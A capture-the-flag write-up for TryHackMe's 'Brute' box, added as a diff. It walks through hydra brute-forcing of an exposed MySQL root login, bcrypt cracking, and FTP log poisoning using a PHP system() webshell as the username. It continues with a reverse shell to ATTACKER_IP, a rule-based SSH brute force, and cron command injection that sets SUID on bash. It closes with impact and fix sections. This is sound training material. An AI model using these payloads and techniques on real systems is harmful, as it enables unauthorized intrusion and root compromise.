@@ -1,0 +1,221 @@
+---
+title: 'Brute'
+description: 'An exposed MySQL root login cracks instantly, FTP log poisoning turns a reflected auth log into RCE, a rule-based SSH brute recovers a user, and a root cron job that echoes an attacker-writable file injects a command to SUID bash.'
+date: 2026-01-08
+platform: tryhackme
+room: 'Brute'
+roomUrl: 'https://tryhackme.com/room/ettubrute'
+difficulty: medium
+tags:
+  - 'ftp'
+  - 'mysql'
+  - 'web'
+  - 'log-poisoning'
+  - 'rce'
+  - 'password-cracking'
+  - 'bcrypt'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'weak credentials'
+  - 'insecure command execution'
+translation: done
+draft: false
+---
+
+## **Brute — Exposed MySQL, FTP Log Poisoning, and a Root Cron That Echoes Your File**
+
+_A walkthrough of TryHackMe's "Brute" box. The name is a hint but the real lesson is layered: an exposed MySQL service with a guessable root password, a web login that reflects the FTP auth log straight back at you (so you poison it into PHP RCE), a rule-based SSH brute to move to a real user, and a root-owned cron script that_ _`echo`\*\*s an attacker-writable file — classic command injection — to drop a SUID shell._
+
+> The flags, cracked passwords, and target IP are redacted. Brute is an authorized training box on TryHackMe; everything here was performed against a legal practice target. Flags are shown as `THM{<redacted>}` and recovered secrets as `<redacted>` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+**MySQL (3306) is exposed to the network** and `root` uses a dictionary password → crack it with hydra, dump `website.users`, and crack Adrian's **bcrypt** hash offline → but the web login reflects the **FTP login log** on-screen, so instead of logging in we **poison the FTP log** by connecting with the username `<?php system($_GET['c']);?>` → the log page executes it → **RCE as** **`www-data`** → a `.reminder` file spells out a **best64 +** **`!`** rule set over the word `ettubrute`, so we build that wordlist and **brute SSH** to land as `adrian` (`user.txt`) → a root cron runs a script that does `sh -c "echo $line"` over `/home/adrian/punch_in`, a file **we can write** → inject `chmod +s /bin/bash`, wait one minute, and `bash -p` gives **root**.
+
+Exposed DB → reflected-log RCE → rule-based SSH brute → command injection in a root cron → root.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+A `rustscan`/`nmap` sweep shows four services: FTP, SSH, an Apache login page, and — notably — **MySQL open to the world**:
+
+```text
+21/tcp   open  ftp     vsftpd 3.0.5
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http    Apache httpd 2.4.41 (Ubuntu)  — "Login" page
+3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
+```
+
+A quick content scan of port 80 finds the usual login plumbing (`index.php`, `welcome.php` → redirects to `login.php`, `config.php`). Nothing jumps out on the web yet — but a database listening on `3306` from an unauthenticated network position is the loudest finding on the board.
+
+### **The vulnerability — a database you can just log into**
+
+MySQL should never be reachable from an untrusted network with a password that lives in a wordlist. Here both are true.
+
+<Callout type="insight">
+
+The interesting twist is the _second_ bug: the web app displays the raw **FTP authentication log** on a page. Any service that echoes a log you can write to is a **log-poisoning** candidate — the FTP `USER` field is attacker-controlled, so we put PHP in it, and the page that renders the log executes it. The database only gets us the user's bcrypt hash; the reflected log is what gets us code execution.
+
+</Callout>
+
+### **Step 1 — crack the exposed MySQL root login**
+
+```text
+hydra -l root -P rockyou.txt $IP mysql
+# [3306][mysql] host: $IP   login: root   password: <redacted>
+```
+
+Log in and dump the application database:
+
+```text
+mysql -h $IP -u root -p --ssl=0
+MySQL [(none)]> show databases;   -- information_schema, mysql, ..., website
+MySQL [website]> select * from users;
+# id | username | password                                                     | created_at
+#  1 | Adrian   | $2y$10$................................bcrypt..............  | 2021-10-20
+```
+
+One user, `Adrian`, with a **bcrypt** (`$2y$`) hash.
+
+### **Step 2 — crack the bcrypt hash offline**
+
+```text
+hashcat -m 3200 -a 0 hash.txt rockyou.txt
+# $2y$10$...:<redacted>
+```
+
+The password cracks in seconds against rockyou. It confirms how the app stores creds, but logging into the web form only shows a page of **failed FTP logins** — which is the real opening.
+
+### **Step 3 — poison the FTP log into RCE**
+
+The log page renders FTP login attempts verbatim. FTP records the _username_ you try, and vsftpd never sanitises it, so we authenticate with a PHP payload as the username:
+
+```text
+ftp -A $IP
+Name: <?php system($_GET['c']);?>
+# 530 Login incorrect.   (but the attempt is now logged)
+```
+
+The log entry lands as `FAIL LOGIN: Client "..."`, and when the web app renders that log, our PHP runs. Pass commands through the `c` parameter (Burp makes this easy), confirm with `ls`, then fire a reverse shell — Python3 is present:
+
+```text
+# attacker
+nc -lvnp 4444
+# via the poisoned log page: python3 reverse shell back to $ATTACKER_IP:4444
+```
+
+Stabilise the shell as `www-data`:
+
+```text
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# www-data@...:/var/www/html$
+```
+
+### **Step 4 — read the hint, brute SSH with a rule set**
+
+In Adrian's home a `.reminder` file describes exactly how to build the password:
+
+```text
+Rules:
+best of 64
++ exclamation
+
+ettubrute
+```
+
+"best of 64" is the `best64` rule set shipped with John and hashcat; "+ exclamation" means append a `!`. We generate the candidates from the single word `ettubrute`:
+
+```text
+echo ettubrute | john --stdout --pipe '--rules=best64' > passwords.txt
+sed -i 's/$/!/' passwords.txt     # append ! to every line
+```
+
+Then brute SSH for `adrian`:
+
+```text
+hydra -l adrian -P passwords.txt ssh://$IP
+# [22][ssh] host: $IP   login: adrian   password: <redacted>
+```
+
+SSH in and grab the user flag:
+
+```text
+ssh adrian@$IP
+adrian@...:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Step 5 — command injection in a root cron job**
+
+Adrian's home holds a punch-card gimmick. A root-owned script loops over a file and echoes each line through a shell:
+
+```text
+#!/bin/sh
+while read line;
+do
+  /usr/bin/sh -c "echo $line";
+done < /home/adrian/punch_in
+```
+
+The file it reads, `/home/adrian/punch_in`, is **writable by adrian**, and a cron entry runs the punch-in logic every minute as root. Because the line is dropped unquoted into `sh -c "echo $line"`, anything we append is executed by root. We add a command that makes `bash` SUID:
+
+```text
+nano /home/adrian/punch_in
+# ...append this line:
+`chmod +s /bin/bash`
+```
+
+Wait for the minute to tick, and `bash` is now SUID root:
+
+```text
+ls -al /usr/bin/bash
+# -rwsr-sr-x 1 root root ... /usr/bin/bash
+/usr/bin/bash -p
+bash-5.0# id && cat /root/root.txt
+# uid=0 ... root
+THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Three compounding failures turn an anonymous network position into root:
+
+- **Network-exposed MySQL with a dictionary** **`root`** **password** — instant database compromise and credential disclosure.
+- **Reflected FTP log → PHP execution** — a classic log-poisoning RCE because an attacker-controlled field (the FTP username) is rendered by a PHP page.
+- **Root cron running** **`sh -c "echo $line"`** **over a user-writable file** — unsanitised command execution as root, trivially escalated to a SUID shell.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Do not expose MySQL to the network.** Bind it to loopback, require strong unique credentials, and never let `root` authenticate remotely with a dictionary password.
+2. **Never render raw logs in a web response**, and treat the FTP username field as untrusted input. Logs should be displayed escaped, not executed.
+3. **Quote shell variables and avoid building commands from file contents.** `sh -c "echo $line"` over a user-writable file is injectable; read data with safe APIs and run privileged jobs over files only root can write.
+4. **Store passwords that resist offline cracking** (bcrypt with a high cost is right, but it doesn't help if the plaintext is a dictionary word).
+
+</Callout>
+
+### **Takeaways**
+
+- **An exposed database is a front door.** A DB on `3306` reachable from the VPN, with a crackable `root`, is game over before the web app even matters.
+- **Anything that echoes a log you can write is RCE.** The FTP username is attacker-controlled; a page that renders that log executes your PHP.
+- **Read the box's hints literally.** `best64 + !` over `ettubrute` is a precise recipe — turn it into a wordlist instead of guessing.
+- **Unquoted variables in root scripts are command injection.** `echo $line` from a file you can write is the whole privesc.
+
+Thanks for reading. "Brute" earns its name, but every rung here is really a trust failure — a database you shouldn't reach, a log you shouldn't see executed, and a root job that trusts a file it shouldn't.
